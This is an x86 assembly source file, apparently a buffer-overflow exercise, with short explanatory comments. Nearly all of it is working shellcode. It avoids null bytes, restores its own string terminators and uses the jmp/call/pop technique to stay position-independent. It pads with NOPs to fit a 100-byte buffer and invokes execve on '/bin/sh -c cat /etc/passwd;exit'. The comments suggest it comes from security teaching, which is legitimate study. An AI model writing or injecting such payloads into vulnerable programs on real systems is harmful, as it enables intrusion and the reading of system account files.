bits 32
;100 'x' characters were used to achieve the length of the buffer and the code length is 97 decimal bytes, therefore 3 (100-97) nop instructions were used for padding.
nop
nop
nop
;use the short modifier to calculate the difference between the value of the instruction pointer and the destination label. This byte is stored on the stack.
start:    jmp short codeEnd
start2:   pop esi 

	  ;clear the A register using xor command to prevent the hex instruction from containing zeros.
	  xor eax, eax
	  ;restore null bytes in data. All addresses are calculated using the difference between esi and exeStr to make the code location independent.
	  mov [byte esi+flagStr-exeStr-2], al
	  mov [byte esi+cmdStr-exeStr-1], al
	  mov [byte esi+arrayAddr-exeStr-1], al
	  mov [byte esi+arrayAddr-exeStr+12], eax
         
	  ;restoring the array.
	  mov [byte esi+arrayAddr - exeStr], esi 
	  lea edi,[byte esi+flagStr-exeStr]
	  mov [byte esi+arrayAddr- exeStr +4], edi
	  lea edi,[byte esi+cmdStr-exeStr]
	  mov [byte esi+arrayAddr- exeStr +8], edi
	  
	  ;setup register and make system call. 
	  ;using al to modify only the lower 8 bits to avoid having zeros in the hex.
	  mov al, 0x0b
	  mov ebx, esi 
	  lea ecx, [byte esi+arrayAddr-exeStr] 
	  ;clear the A register using xor command to prevent the hex instruction from containing zeros.
	  xor edx, edx
	  ;hex code for interrupt call.
	  int 0x80
	  
codeEnd:  call start2

	;data segment.
;extra y character to change X offset from 0x0A to 0x0B to avoid the null character(0x0A).	
exeStr: db "/bin/shXy"
flagStr: db "-cX"
cmdStr:  db "cat /etc/passwd;exitX"
;0xffffffff was arbitrarily chosen so that the bytes can be effectively transmitted.
arrayAddr: 	dd 0xffffffff 
           	dd 0xffffffff 
	   	dd 0xffffffff 
	   	dd 0xffffffff

;computing the code length by letting the assembler calculate the difference.
newAddr:   dd newAddr-start
	 



